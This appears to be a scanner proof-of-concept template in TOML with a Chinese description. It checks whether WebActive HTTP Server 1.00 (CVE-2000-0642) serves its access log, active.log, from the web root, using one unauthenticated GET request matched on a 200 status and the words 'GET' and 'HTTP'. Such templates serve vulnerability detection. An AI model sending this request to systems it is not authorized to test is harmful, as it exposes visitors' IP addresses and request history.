[info]
author = "AVE"
description = "WebActive HTTP Server 1.00 默认将访问日志 active.log 存储在 Web 根目录下，远程攻击者无需认证即可通过 HTTP GET 请求直接获取日志内容，泄露用户 IP、请求路径等敏感信息。"
id = "POC-AVE-2000-0780"
name = "WebActive HTTP Server 日志信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0780"]
vuln_id = [
    "CVE-2000-0642",
    "AVE-2000-0780",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/active.log"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "GET",
    "HTTP",
]
